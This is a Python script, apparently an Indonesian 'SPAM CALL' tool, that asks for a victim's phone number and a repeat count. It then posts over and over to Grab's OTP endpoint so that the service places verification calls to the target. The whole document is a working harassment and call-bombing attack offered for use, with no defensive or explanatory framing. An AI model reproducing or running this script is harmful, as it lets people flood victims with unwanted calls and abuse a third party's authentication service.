#!/bin/usr/python

import os, requests, time

os.system('clear')
c=('\033[1;31m')
r=('\033[1;32m')
g=('\033[1;33m')
w=('\033[1;35m')

print ("""\033[1;35m
	   \033[1;35m \\\\\\\\/////
	    ---------	\033[1;33mSPAM CALL v.2.0
\033[1;35m	   / __    __\	\033[1;33mAuthor: Hacker online
	   |  0\  /0 |	\033[1;33msIG    : editor_indonesia1_
	    \    |  /
	     \  __ /
	      -----
   \033[1;32mMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)
""")

print (" ")
no1 = input("[+] NUM TARGET 1 => %s"%(w))
jlmh=int(input("%s[+] JUMLAH SPAM => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}

try:
	print()
	print("%s[!] HASIL:%s"%(r,w))
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		if str(idk) in str(r1.text):
			print("[+] BERHASIL")
		else:
			print("[-] GAGAL")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%ssampai jumpa Lagi..."%(c))
